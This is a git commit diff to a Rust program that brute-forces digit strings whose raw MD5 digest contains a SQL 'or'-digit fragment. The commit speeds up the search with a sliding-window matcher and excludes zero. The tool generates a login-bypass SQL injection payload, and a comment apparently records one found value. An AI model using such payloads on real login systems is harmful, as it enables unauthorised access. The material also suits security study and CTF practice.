b7c16fca5480bc42cd227665ababde36f95d12d2
Artemis Livingstone <ar.d.livingstone@gmail.com>
2023-11-19 21:18:10 -0500

    Switch to use sliding window, fix 0 being a valid number

--- src/main.rs
+++ src/main.rs
@@ -6,12 +6,39 @@ use once_cell::sync::Lazy;
 use regex::bytes::Regex;
 
 /// Regex to detect an escape, followed by an OR pattern, followed by another opening single quote then a digit
-/// This is significantly faster than the previous string search method.
-static INJECTION_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"'(\|\||or)'\d").unwrap());
+/// This is significantly faster than the string search method, but slower than the sliding window.
+static INJECTION_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"'(\|\||or)'[1-9]").unwrap());
 
 #[inline]
+#[allow(dead_code)]
 fn byte_validate(digest: &[u8]) -> bool {
     INJECTION_REGEX.is_match(digest)
+}
+
+/// Faster than byte regex, but less flexible
+#[allow(dead_code)]
+#[inline]
+fn window_byte_validate(digest: &[u8]) -> bool {
+    for block in digest.windows(5) {
+        // Escape
+        if block[0] != b'\'' {
+            continue;
+        }
+        // OR
+        if !(block[1] == b'|' && block[2] == b'|' || block[1] == b'o' && block[2] == b'r') {
+            continue;
+        }
+        // Restart string
+        if block[3] != b'\'' {
+            continue;
+        }
+        // Ignore 0 as it would evaluate to false
+        if block[4] <= b'0' || block[4] > b'9' {
+            continue;
+        }
+        return true;
+    }
+    false
 }
 
 // 87153179503375488964249572016766023268706569805029887102402011499288342510775092757977654940386142689199562616975803271832089582121260280598138107679172885818920928633840231384484533108096150415512236913966
@@ -31,10 +58,12 @@ fn main() {
 
 fn crack() {
     // Create all in memory objects here to reduce re-allocation.
-    let mut i = 0;
+    let mut i: usize = 0;
     let mut buf: Vec<u8> = Vec::with_capacity(400);
     // Distribution for selecting random
     let mut hasher = Md5::new();
+    let mut gen_digest: Output<CoreWrapper<Md5Core>>;
+    let mut digest: &[u8];
     loop {
         if i % 1_000_000 == 0 {
             println!("i = {i}");
@@ -56,13 +85,14 @@ fn crack() {
         buf.push(fastrand::u8(48..=57));
 
         // Calculate md5 hash
-        let gen_digest = rust_digest(&mut hasher, &buf);
-        let digest = gen_digest.as_slice();
+        gen_digest = rust_digest(&mut hasher, &buf);
+        digest = gen_digest.as_slice();
 
         // Check if we can create the OR statement from it.
-        if byte_validate(digest) {
+        if window_byte_validate(digest) {
             println!("Found! i = {i}");
-            println!("Content = {buf:?}");
+            let string = buf.iter().map(|&c| c as char).collect::<String>();
+            println!("Content = `{string}`");
             let str_digest = String::from_utf8_lossy(digest);
             println!("Raw md5 Hash = {str_digest}");
             return;
